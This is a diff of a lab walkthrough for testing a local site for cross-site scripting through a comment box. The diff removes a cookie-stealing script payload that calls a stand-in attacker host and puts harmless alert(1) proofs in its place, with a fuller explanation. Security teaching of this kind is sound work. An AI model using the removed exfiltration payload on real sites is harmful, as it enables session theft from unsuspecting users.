@@ -42,6 +42,7 @@ curl -I http://xxs.local/
 
 ### 2.2 Normal input (confirm baseline)
 1. Enter `My Comment!` into the input box.  
+![Comment Box Input](/screenshots/xss-2.png)  
 2. Click **Submit / Post**.  
 3. Verify the page reloads and shows `My Comment!` rendered as plain text.
 
@@ -50,15 +51,15 @@ curl -I http://xxs.local/
 ### 2.3 Malicious input (payload)
 1. In the same input, enter the following payload exactly (paste into the comment/search box):
 ```html
-<script>fetch('https://attacker.example/steal?c='+encodeURIComponent(document.cookie))</script>
+<script>alert(1);</script>
 ```
 2. Click **Submit / Post**.
 
-**Expected:** Instead of showing the text, the browser will execute the script. In the lab this may cause an outgoing request or simply trigger an alert if external requests are blocked. The key indicator is that `<script>` tags execute — vulnerability confirmed.
+**Expected:** Instead of showing the text, the browser will execute the script. In our instance, a small alert pop-up box appears with the number '1' inside. This happens because the website is not sanitising or escaping user input. It's treating what we type as plain text and inserting it directly into the HTML page. The alert is actually harmless however, it proves that the website is vulnerable to XSS. The key indicator is that `<script>` tags execute — vulnerability confirmed.
 
 > If the lab blocks outgoing requests, use a benign proof payload:
 ```html
-<script>alert('XSS OK')</script>
+<script>alert(1)</script>
 ```
 
 ### 2.4 Reflected via URL (GET)
